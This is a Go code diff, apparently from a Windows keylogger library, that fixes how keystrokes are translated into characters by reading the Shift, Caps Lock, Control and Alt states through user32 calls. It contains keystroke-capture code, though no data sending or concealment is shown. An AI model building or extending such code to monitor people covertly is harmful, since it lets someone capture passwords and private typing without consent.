@@ -17,6 +17,7 @@ var (
 	procToUnicodeEx           = moduser32.NewProc("ToUnicodeEx")
 	procGetKeyboardLayoutList = moduser32.NewProc("GetKeyboardLayoutList")
 	procMapVirtualKeyEx       = moduser32.NewProc("MapVirtualKeyExW")
+	procGetKeyState           = moduser32.NewProc("GetKeyState")
 )
 
 // NewKeylogger creates a new keylogger depending on
@@ -77,13 +78,27 @@ func (kl Keylogger) ParseKeycode(keyCode int, keyState uint16) Key {
 	outBuf := make([]uint16, 1)
 
 	// Buffer to store the keyboard state in
-	kbState := make([]uint16, 256)
+	kbState := make([]uint8, 256)
 
 	// Get keyboard layout for this process (0)
 	kbLayout, _, _ := procGetKeyboardLayout.Call(uintptr(0))
 
-	for i := 0; i < 256; i++ {
-		kbState[i] = w32.GetAsyncKeyState(i)
+	// Put all key modifier keys inside the kbState list
+	if w32.GetAsyncKeyState(w32.VK_SHIFT)&(1<<15) != 0 {
+		kbState[w32.VK_SHIFT] = 0xFF
+	}
+
+	capitalState, _, _ := procGetKeyState.Call(uintptr(w32.VK_CAPITAL))
+	if capitalState != 0 {
+		kbState[w32.VK_CAPITAL] = 0xFF
+	}
+
+	if w32.GetAsyncKeyState(w32.VK_CONTROL)&(1<<15) != 0 {
+		kbState[w32.VK_CONTROL] = 0xFF
+	}
+
+	if w32.GetAsyncKeyState(w32.VK_MENU)&(1<<15) != 0 {
+		kbState[w32.VK_MENU] = 0xFF
 	}
 
 	_, _, _ = procToUnicodeEx.Call(
